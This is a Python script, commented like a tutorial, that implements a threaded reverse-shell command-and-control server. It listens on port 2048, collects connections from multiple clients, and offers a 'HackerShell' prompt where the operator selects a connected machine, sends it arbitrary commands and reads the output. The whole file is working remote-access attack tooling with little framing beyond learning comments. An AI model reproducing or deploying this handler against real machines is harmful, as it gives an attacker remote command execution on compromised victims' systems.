#this script..
# ..creates a socket
# ..binds the socket
# ..listens for connections
# ..accepts connections from multiple clients and stores them in a list
# ..establishes a connection to a selected connection and communicates

#THREAD 1: takes care of listening for and establishing a connection
#creating the socket
#binding the socket
#listening for connections
#accepting connections

#THREAD 2: takes care of selecting connections and interacting with them

#remember we need the queues to allow the program run the differnt tasks (making a connection and communicating w a connection) simulteneously.

#THREAD 1

#first, import the necessary modules/packages needed to work with sockets and threads
import socket
import sys
from queue import Queue #Queue is used with threads
import threading
import time #to prevent connection timeouts

#create variables to store the lists of client connection objects and the client address lists
connected_connections = []
connected_addresses = []
number_of_threads = 2   #the number of workers needed
list_of_threads = [x for x in range(1, number_of_threads+1)]    #list of workers (each worker will have a work function in it) from the queue
queue = Queue()     #used to hold the list of workers. they are called to receive their work functions from here

#THREAD 1:...

#create your socket
def create_socket():
    #store your socket in a variable (could be global depending on your program)
    global server_socket
    server_socket = socket.socket()
    print('Socket successfully created!\n')

#bind your socket to your server ip address id and port
def bind_socket():
    #create variables to store your server host and port number (could be global variables depending on your program)
    global host
    global port
    global server_socket

    #assign values to your variables
    host = ''
    port = 2048

    #bind your variables to your socket
    server_socket.bind((host, port))
    print('Socket successfully binded!\n')
    server_socket.listen(5)
    print('Server is listening for connections...')

#accept connections from multiple clients
#refer to lists of client connection objects and client address lists and add accepted connections to the lists
def accept_connections():
    #import your global variables
    global server_socket

    #close all open existing connections when the server is restarted
    for x in connected_connections:
        x.close()
    del connected_connections[:]
    del connected_addresses[:]

    #create an infinite loop and accept connections
    while True:
        client_socket, client_address = server_socket.accept()

        #to prevent timeout of connection due to inactivity, set the setblocking time to 1
        server_socket.setblocking(1)

        #add the acepted connections to your lists
        connected_connections.append(client_socket)
        connected_addresses.append(client_address)

        print('Server successfully connected to ', client_address[0])

#THREAD 2:...
#functions
#- list connections
#- select connections
#- communicate (send commands and receive responses) from client

#first, create a custom interactive shell that gives you access to your connections. you can also select the desired connection from this shell
#(this is basically a prompt to see your connections and select the device you want to work with)
def start_shell():
    #create a variable to store your server input
    print('ALL SHELL COMMANDS MUST BE IN LOWERCASE \n')
    print("Enter 'list' to see a list of your connections\nEnter 'select' followed by the connection ID number to select a connection\n")
    
    while True:
        server_command = input('HackerShell> ')

        #perform data checks and perform functions based on data checks
        to_list = 'list'
        if server_command.lower() == to_list:
            #we can call a function that lists the connections we have
            #or we can flat out write a function that lists our connections
             list_connections()  #this function lists the available connections in our server socket (we will create the function later on)

        #then, create a condition that initiates selecting a target
        elif 'select' in server_command:
            your_connection = get_target_connection(server_command)     #if select is in our input comand, that input gets passed into the get_target fxn to select a connection. and the result of the function is the client socket connection objest

            #check if the connection is active and give commands
            if your_connection is not None: 
                #create a function to send and recv commands to and from the client.
                send_recv_commands(your_connection)   #pass the client_socket class into the function
            else:
                print(server_command[7:], ' command does not exist')

#function to list the active connections
def list_connections():
    #create an empty variable to store the output of the list of connections
    list_active_connections = ''

    #loop(enumerate) through the list that contains the accepted or connected client class object and check if they are active
    for i, client_socket in enumerate(connected_connections):
        try:
            client_socket.send(str.encode(' '))
            # you check if they are active by sending them a dummy packet. if you get a response, they are active. if not, they are no longer active
            client_socket.recv(204800)
            #(the above comment also serves as a 'checker' for the program to update the connections list about active and inactive connections)...
            #
            # ....if the connection is inactive, it deletes that connection and address from their respective lists
        except:
            del connected_connections[i]
            del connected_addresses[i]
            continue    #(used to go back to the try if the except code ran in order to complete the checks before coming out of the loop)

        #if the connection is active, it gets added to the 'output of list of connections' empty variable
        list_active_connections = str(i) + '---' +str(connected_addresses[i][0])+ '---' +str(connected_addresses[i][1])+ '\n'

    #coming out of the loop, print the 'output of active connections' variable
    print('REVERSE ACCESS TO...' +'\n'+ list_active_connections)

#create a function to get the target connection
def get_target_connection(server_command):
    try:
        #create a variable to strip the 'select' from the server command, leaving only the ID number (its identifier)
        target_connection = server_command.replace('select ', '')

        #change it from a string to an integer
        target_connection = int(target_connection)

        #the one you want is....
        #create a variable to store the socket of the 'target_connection' enumerate number in the list of client class objects
        #again, the one you want is...
        your_connection = connected_connections[target_connection]

        #print to show the connection
        print('Connected to: ' +str(connected_addresses[target_connection][0])+ ' on Port: ' +str(connected_addresses[target_connection][1]))

        #change the prompt to the ip address of the client
        print(str(connected_addresses[target_connection][0])+ '> ', end='')

        #return the connection class of the target position from the client object class list
        return your_connection
    except:
        print('Connection Error')
        return None

#create a function to send commands and receive responses to and from from the client
def send_recv_commands(your_connection):
    while True:
        try:
            #create a variable to store the server input command
            server_input = input('what do you want > ')

            #perform data checks
            if server_input == 'quit':
                break
            if len(str.encode(server_input)) > 0:
                your_connection.send(str.encode(server_input))
                client_response = str(your_connection.recv(20488080), 'utf-8')
                print(client_response)
        except:
            print('Error sending commands')

#create your threads to share tasks for your program
def create_threads():
    #use a for loop in the range of the number of workers (threads) needed to create the threads (workers)
    for i in range(number_of_threads):

        #store the threads created in a variable
        t = threading.Thread(target=work_details)
        #'(target=work_details)' is used to assign each thread to their work (worker to his work)...
        # ...so when i = 1 that is the first thread and we would program the work function for 1 with a task so t1 performs that task...abbl

        #set the t.daemon to True so that the thread frees the memory space when the program stops
        t.daemon = True

        #start the thread
        t.start()

#create a function to create our queue (copy our list into a queue) (stores the work function for each task. the work is inside the queue)
def work_folder():
    #go through your list of threads(workers)
    for i in list_of_threads:
        #put each list element in a queue
        queue.put(i)

    #join the queue
    queue.join()

#create the work and assign them to their respective queue number
def work_details():
    #create an infiite loop (since i know the number of threads, can i use a for loop?)
    while True:
        #create a variable to store the queue number from your queue
        q_numb = queue.get()

        #perform data checks on the q_number and give them assignments for that number
        if q_numb == 1:
            create_socket()
            bind_socket()
            accept_connections()
        if q_numb == 2:
            start_shell()

        #after the queue is finished, come out of the loop and end the queue
        queue.task_done()


#call your functions to run your program

def main():
    create_threads()
    work_folder()

main()




















